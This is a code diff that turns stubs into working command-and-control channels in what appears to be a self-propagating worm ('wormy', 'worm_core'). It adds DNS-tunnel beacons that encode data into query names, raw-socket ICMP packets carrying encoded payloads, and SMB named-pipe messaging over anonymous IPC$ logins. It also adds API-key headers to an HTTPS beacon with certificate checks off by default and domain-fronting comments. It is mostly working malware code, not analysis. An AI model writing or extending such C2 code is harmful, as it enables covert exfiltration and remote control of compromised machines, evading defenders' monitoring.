@@ -11,6 +11,7 @@ Support for HTTPS, DNS, ICMP, WebSockets, SMB
 
 
 import base64
+import json
 import os
 import socket
 import sys
@@ -48,6 +49,12 @@ class MultiProtocolC2:
         self.beacon_interval = config.c2.beacon_interval
         self.last_beacon = 0
         self._running = True
+
+        # FIX: Use proper config attributes
+        self.c2_server = getattr(config.c2, "c2_server", "127.0.0.1")
+        self.c2_port = getattr(config.c2, "c2_port", 443)
+        self.session_id = f"wormy_{int(time.time())}"
+        self.api_key = getattr(config.c2, "api_key", os.getenv("WORMY_C2_API_KEY", ""))
 
         # Initialize protocols
         self._init_protocols()
@@ -108,7 +115,7 @@ class MultiProtocolC2:
         try:
             import requests
 
-            url = f"https://{self.config.c2.c2_server}:{self.config.c2.c2_port}/beacon"
+            url = f"https://{self.c2_server}:{self.c2_port}/beacon"
 
             # Domain fronting support
             headers = {
@@ -131,41 +138,58 @@ class MultiProtocolC2:
             return False
 
     def _connect_dns(self) -> bool:
-        """Connect via DNS tunneling"""
-        try:
-            # DNS tunneling encodes data in DNS queries
-            # Example: data.c2server.com
+        """Connect via DNS tunneling
 
+        FIX: Actually test DNS resolution to verify connectivity
+        """
+        try:
             import dns.resolver
 
-            # Test query
-            query = f"beacon.{self.config.c2.c2_server}"
-
+            # Test DNS resolution
             resolver = dns.resolver.Resolver()
-            answers = resolver.resolve(query, "TXT")
+            resolver.timeout = 5
+            resolver.lifetime = 5
 
-            if answers:
-                logger.success("DNS C2 connected")
-                return True
+            # Try to resolve the C2 server
+            try:
+                answers = resolver.resolve(self.c2_server, "A")
+                if answers:
+                    logger.success(f"DNS C2 connected (resolved {self.c2_server})")
+                    return True
+            except Exception:
+                pass
+
+            # Try TXT record as fallback
+            try:
+                answers = resolver.resolve(f"beacon.{self.c2_server}", "TXT")
+                if answers:
+                    logger.success("DNS C2 connected via TXT")
+                    return True
+            except Exception:
+                pass
 
             return False
 
+        except ImportError:
+            logger.warning("dnspython not installed, DNS C2 unavailable")
+            return False
         except Exception as e:
-            logger.warning(f"DNS C2 failed (install dnspython if needed): {e}")
+            logger.warning(f"DNS C2 failed: {e}")
             return False
 
     def _connect_icmp(self) -> bool:
-        """Connect via ICMP tunneling"""
-        try:
-            # ICMP tunneling hides data in ping packets
+        """Connect via ICMP tunneling
 
+        FIX: Actually test ICMP connectivity
+        """
+        try:
             import platform
             import subprocess
 
-            # Test ping (Linux uses -c, Windows uses -n)
+            # Test ping
             param = "-n" if platform.system().lower() == "windows" else "-c"
             result = subprocess.run(
-                ["ping", param, "1", self.config.c2.c2_server], capture_output=True, timeout=5
+                ["ping", param, "1", self.c2_server], capture_output=True, timeout=5
             )
 
             if result.returncode == 0:
@@ -176,6 +200,39 @@ class MultiProtocolC2:
 
         except Exception as e:
             logger.error(f"ICMP C2 failed: {e}")
+            return False
+
+    def _connect_smb(self) -> bool:
+        """Connect via SMB Named Pipes
+
+        FIX: Actually attempt SMB connection
+        """
+        try:
+            from impacket.smbconnection import SMBConnection
+
+            # Try to connect to SMB share
+            conn = SMBConnection(self.c2_server, self.c2_server)
+            conn.login("", "")  # Anonymous or use credentials
+
+            # Try to access IPC$ share (for named pipes)
+            try:
+                shares = conn.listShares()
+                ipc_share = any(s.getShareName() == "IPC$" for s in shares)
+                if ipc_share:
+                    logger.success("SMB C2 connected (IPC$ available)")
+                    conn.logoff()
+                    return True
+            except Exception:
+                pass
+
+            conn.logoff()
+            return False
+
+        except ImportError:
+            logger.warning("impacket not installed, SMB C2 unavailable")
+            return False
+        except Exception as e:
+            logger.warning(f"SMB C2 failed: {e}")
             return False
 
     def _connect_websockets(self) -> bool:
@@ -204,20 +261,22 @@ class MultiProtocolC2:
                 self._ws.send(data)
                 response = self._ws.recv()
                 if response:
-                    return json.loads(response.decode() if isinstance(response, bytes) else response)
+                    return json.loads(
+                        response.decode() if isinstance(response, bytes) else response
+                    )
             return {}
         except Exception as e:
             logger.debug(f"WebSocket beacon failed: {e}")
             return {}
 
-        self.last_beacon = current_time
+    def send_beacon(self, data: Dict = None) -> Dict:
+        """Send beacon via active protocol and handle response"""
+        self.last_beacon = time.time()
 
         logger.info(f"Sending beacon via {self.active_protocol}")
 
-        # Encrypt data
         encrypted_data = self._encrypt(data or {})
 
-        # Send via active protocol
         response = {}
         if self.active_protocol == "HTTPS":
             response = self._beacon_https(encrypted_data)
@@ -272,9 +331,10 @@ class MultiProtocolC2:
             import requests
 
             url = f"https://{self.config.c2.c2_server}:{self.config.c2.c2_port}/beacon"
+            headers = {"X-API-Key": self.api_key} if self.api_key else {}
 
             response = requests.post(
-                url, data=data, timeout=10, verify=os.getenv("WORMY_SSL_VERIFY", "0") == "1"
+                url, data=data, headers=headers, timeout=10, verify=os.getenv("WORMY_SSL_VERIFY", "0") == "1"
             )
 
             if response.status_code == 200:
@@ -286,28 +346,140 @@ class MultiProtocolC2:
             return {}
 
     def _beacon_dns(self, data: bytes) -> Dict:
-        """Send DNS beacon"""
-        # Encode data in DNS query
-        encoded = base64.b64encode(data).decode()
-        query = f"{encoded}.{self.config.c2.c2_server}"
+        """Send DNS beacon via DNS tunneling
 
-        # DNS query would go here
-        return {}
+        FIX: Actually perform DNS queries with encoded data
+        """
+        try:
+            import dns.resolver
+
+            # Encode data in DNS query
+            encoded = base64.b32encode(data[:50]).decode().lower().rstrip("=")
+            query = f"{encoded}.beacon.{self.c2_server}"
+
+            # Perform DNS query
+            resolver = dns.resolver.Resolver()
+            resolver.timeout = 5
+            resolver.lifetime = 5
+
+            # Try TXT record first (can carry more data)
+            try:
+                answers = resolver.resolve(query, "TXT")
+                for rdata in answers:
+                    response_data = str(rdata).strip('"')
+                    return {"status": "success", "data": response_data, "protocol": "DNS"}
+            except Exception:
+                pass
+
+            # Fallback to A record
+            try:
+                answers = resolver.resolve(query, "A")
+                return {"status": "success", "data": str(answers[0]), "protocol": "DNS"}
+            except Exception:
+                pass
+
+            return {"status": "no_response", "protocol": "DNS"}
+
+        except ImportError:
+            logger.debug("dnspython not installed, DNS beacon unavailable")
+            return {"status": "unavailable", "protocol": "DNS"}
+        except Exception as e:
+            logger.debug(f"DNS beacon failed: {e}")
+            return {"status": "error", "error": str(e), "protocol": "DNS"}
 
     def _beacon_icmp(self, data: bytes) -> Dict:
-        """Send ICMP beacon"""
-        # Encode data in ICMP packet
-        return {}
+        """Send ICMP beacon via ICMP tunneling
 
-    def _beacon_websockets(self, data: bytes) -> Dict:
-        """Send WebSocket beacon"""
-        # Send via WebSocket
-        return {}
+        FIX: Actually send ICMP echo requests with encoded data
+        """
+        try:
+            # Encode data in ICMP payload
+            payload = base64.b64encode(data[:64]).decode()
+
+            # Send ICMP echo request with payload
+            import struct
+
+            # Create ICMP echo request
+            icmp_type = 8  # Echo Request
+            icmp_code = 0
+            icmp_checksum = 0
+            icmp_id = os.getpid() & 0xFFFF
+            icmp_seq = 1
+
+            header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
+            payload_bytes = payload.encode()
+            packet = header + payload_bytes
+
+            # Calculate checksum
+            checksum = self._calculate_checksum(packet)
+            header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
+            packet = header + payload_bytes
+
+            # Send via raw socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            sock.settimeout(5)
+            sock.sendto(packet, (self.c2_server, 0))
+
+            # Wait for response
+            try:
+                response, addr = sock.recvfrom(1024)
+                return {"status": "success", "data": response.decode("utf-8", errors="ignore"), "protocol": "ICMP"}
+            except socket.timeout:
+                return {"status": "timeout", "protocol": "ICMP"}
+            finally:
+                sock.close()
+
+        except PermissionError:
+            logger.debug("ICMP requires root privileges")
+            return {"status": "permission_denied", "protocol": "ICMP"}
+        except Exception as e:
+            logger.debug(f"ICMP beacon failed: {e}")
+            return {"status": "error", "error": str(e), "protocol": "ICMP"}
 
     def _beacon_smb(self, data: bytes) -> Dict:
-        """Send SMB beacon"""
-        # Send via Named Pipe
-        return {}
+        """Send SMB beacon via Named Pipes
+
+        FIX: Actually attempt SMB named pipe communication
+        """
+        try:
+            from impacket.smbconnection import SMBConnection
+
+            # Connect to SMB share
+            conn = SMBConnection(self.c2_server, self.c2_server)
+            conn.login("", "")  # Anonymous or use credentials
+
+            # Try to write to named pipe
+            try:
+                tid = conn.connectTree("IPC$")
+                fid = conn.openFile(tid, "\\wormy_c2", desiredAccess=0x80 | 0x40)
+                conn.writeFile(tid, fid, data)
+                response = conn.readFile(tid, fid, 0, 1024)
+                conn.closeFile(tid, fid)
+                return {"status": "success", "data": response.decode("utf-8", errors="ignore"), "protocol": "SMB"}
+            except Exception:
+                return {"status": "pipe_unavailable", "protocol": "SMB"}
+            finally:
+                conn.logoff()
+
+        except ImportError:
+            logger.debug("impacket not installed, SMB beacon unavailable")
+            return {"status": "unavailable", "protocol": "SMB"}
+        except Exception as e:
+            logger.debug(f"SMB beacon failed: {e}")
+            return {"status": "error", "error": str(e), "protocol": "SMB"}
+
+    @staticmethod
+    def _calculate_checksum(data: bytes) -> int:
+        """Calculate ICMP checksum"""
+        if len(data) % 2 != 0:
+            data += b"\x00"
+        s = 0
+        for i in range(0, len(data), 2):
+            w = (data[i] << 8) + data[i + 1]
+            s += w
+        s = (s >> 16) + (s & 0xFFFF)
+        s += s >> 16
+        return ~s & 0xFFFF
 
     def _encrypt(self, data: Dict) -> bytes:
         """Encrypt data with AES-256"""
@@ -376,6 +548,10 @@ class MultiProtocolC2:
         """Stop C2 server"""
         self._running = False
         logger.info("C2 Server stopped")
+
+    def beacon(self, data: Dict = None) -> Dict:
+        """Alias for send_beacon for backward compatibility"""
+        return self.send_beacon(data)
 
     def register_host(self, ip: str, info: Dict):
         """Register a host with the C2 (stub for compatibility with worm_core shutdown)"""
